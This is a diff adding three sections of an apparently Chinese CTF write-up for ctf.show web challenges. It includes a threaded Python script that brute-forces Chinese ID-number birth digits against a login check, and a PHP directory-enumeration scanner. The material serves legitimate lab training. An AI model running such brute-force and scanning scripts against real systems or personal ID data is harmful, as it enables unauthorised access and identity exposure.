@@ -374,3 +374,169 @@ echo  mt_rand()+mt_rand();/*输出第二个序列+第三个序列 */
 - r=第一个随机数；写token到cookie中
 
 ![image-20261027173031473](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261027173031473.png)
+
+---
+
+## web26
+
+发现，什么都不填写，直接点开始安装，也能连接到服务器，然后用burp抓包，就能拿到flag了
+
+![image-20261028164155594](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261028164159725.png)
+
+![image-20261028164344407](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261028164352984.png)
+
+
+
+---
+
+## web27
+
+![image-20261029095819567](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261029095819567.png)
+
+打开以后会发现，这是一个教务管理系统的登陆界面，先点击界面上所有的按键或者通道，看看能不能发现什么信息
+
+点击学生名单
+
+![image-20261029100017015](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261029100017015.png)
+
+发现这写学生的身份证号码都差中间的8位，这八位刚好是出生的年月日，这算是生活常识，不信你去看看你的身份证中间是不是你的出生年月日。
+
+![image-20261029100034981](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261029100034981.png)这里又看到一个学院录取的通道，需要填写姓名和身份证号，根据上边的名单，现在只有身份证号是未知的，我们现在的目标就是找出符合这个人名的身份证号，所以我们这里需要爆破，试出身份证号
+
+### 具体操作：
+
+脚本爆破
+
+先爆破第一个人的身份证号，第一个人-“高先伊”
+
+```python
+# -*- coding: utf-8 -*-
+# 极速版: 并发16线程 + 年份智能排序(1990-2005优先) —— 预计30秒~1分钟命中
+import urllib.request, urllib.parse
+from concurrent.futures import ThreadPoolExecutor
+
+URL  = 'https://0cfaf7bf-2eba-4daf-9e06-847205f0b99e.challenge.ctf.show/info/checkdb.php'
+NAME = '高先伊'; PRE = '621022'; END = '5237'
+
+W = [7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2]; C = "10X98765432"
+DAYS = [31,28,31,30,31,30,31,31,30,31,30,31]
+
+def build():
+    out = []
+    for y in list(range(1990, 2006)) + list(range(1960, 1990)) + list(range(2006, 2011)):
+        for m in range(1, 13):
+            dmax = 29 if (m == 2 and y % 4 == 0) else DAYS[m-1]
+            for d in range(1, dmax + 1):
+                b = '%04d%02d%02d' % (y, m, d)
+                i17 = PRE + b + END[:3]
+                if C[sum(int(a)*x for a, x in zip(i17, W)) % 11] == END[3]:
+                    out.append(i17 + END[3])
+    return out
+
+def shoot(pid):
+    try:
+        data = urllib.parse.urlencode({'a': NAME, 'p': pid}).encode()
+        r = urllib.request.urlopen(urllib.request.Request(URL, data=data), timeout=15).read().decode()
+        if 'error' not in r:
+            print('=== 命中 ===', pid, r)
+            return pid
+    except Exception:
+        pass
+    return None
+
+cands = build()
+print('候选 %d 条, 16并发开跑...' % len(cands))
+with ThreadPoolExecutor(16) as pool:
+    for r in pool.map(shoot, cands):
+        if r:
+            print('答案:', r)
+            pool.shutdown(cancel_futures=True)   # 命中即停
+            break
+print('完毕')
+```
+
+
+
+![image-20261029105342251](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261029105342251.png)
+
+拿到身份证后，去登录
+
+![image-20261029105459649](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261029105459649.png)
+
+可以知道账号和密码
+
+![image-20261029105432671](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261029105432671.png)
+
+---
+
+## web28
+
+![image-20261029152212287](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261029152212287.png)
+
+这题一打开，发现页面，源码什么也没有，但是，url本身就有提示`/0/1/2.txt`是`/数字/数字/文件`说明，数字部分我们是可以爆破的
+
+脚本爆破
+
+```php
+<?php
+// web28_dir2.php —— web28 终极版: 扫 /A/B/ 两层目录 (A,B ∈ 0..100), 找回 200 的目录 = 有 index 页 = flag所在
+// 判据: 302=不存在(PHP守门员), 403=空目录, 200=命中!
+set_time_limit(0);
+$base = 'https://8c11b609-fd04-49d5-85b5-ba1b6af5d78c.challenge.ctf.show';   // <<< 换实例只改这里
+$nl = (php_sapi_name()=='cli') ? "\n" : '<br>';
+
+$tasks = [];
+foreach (range(0, 100) as $a) {
+  foreach (range(0, 100) as $b) {
+    $tasks["$a/$b"] = "$base/$a/$b/";
+  }
+}
+echo count($tasks) . " 个组合, 32并发开跑..." . $nl;
+
+function shoot32($tasks) {
+  $mh = curl_multi_init(); $chs = [];
+  foreach ($tasks as $key => $u) {
+    $ch = curl_init($u);
+    curl_setopt_array($ch, [
+      CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10,
+      CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => 0,
+    ]);
+    curl_multi_add_handle($mh, $ch); $chs[$key] = $ch;
+  }
+  $active = 0;
+  do { curl_multi_exec($mh, $active); if ($active) curl_multi_select($mh, 1); } while ($active > 0);
+  $out = [];
+  foreach ($chs as $key => $ch) {
+    $b = curl_multi_getcontent($ch);
+    $c = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $out[$key] = [$c, $b === false ? '' : (string)$b];
+    curl_multi_remove_handle($mh, $ch); curl_close($ch);
+  }
+  curl_multi_close($mh);
+  return $out;
+}
+
+$done = 0; $hits = []; $expired = false;
+foreach (array_chunk($tasks, 32, true) as $batch) {
+  foreach (shoot32($batch) as $key => $t) {
+    list($code, $body) = $t; $done++;
+    if ($code === 0) continue;
+    // 实例中途过期检测: 1.5万字节大404页
+    if (strlen($body) > 15000 && strpos($body, '容器已过期') !== false) { $expired = true; break 2; }
+    if ($code !== 302) $hits[$key] = [$code, $body];   // 200/403/404都记下来, 但重点是200
+  }
+  if ($done % 640 === 0) { echo "[进度] $done/" . count($tasks) . $nl; if (php_sapi_name()!='cli') flush(); }
+}
+if ($expired) { echo "!!! 实例中途过期, 回ctf.show重开, 改\$base再跑 !!!" . $nl; }
+
+echo "===== 结局 ===== 扫完$done" . $nl;
+foreach ($hits as $key => $h) {
+  $mark = ($h[0] === 200) ? '  <== 200 命中! 正文: ' . trim(strip_tags(substr($h[1], 0, 80))) : '';
+  echo "[$key]  HTTP {$h[0]}$mark" . $nl;
+}
+
+```
+
+![image-20261029152730432](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261029152730432.png)
+
+最终结果
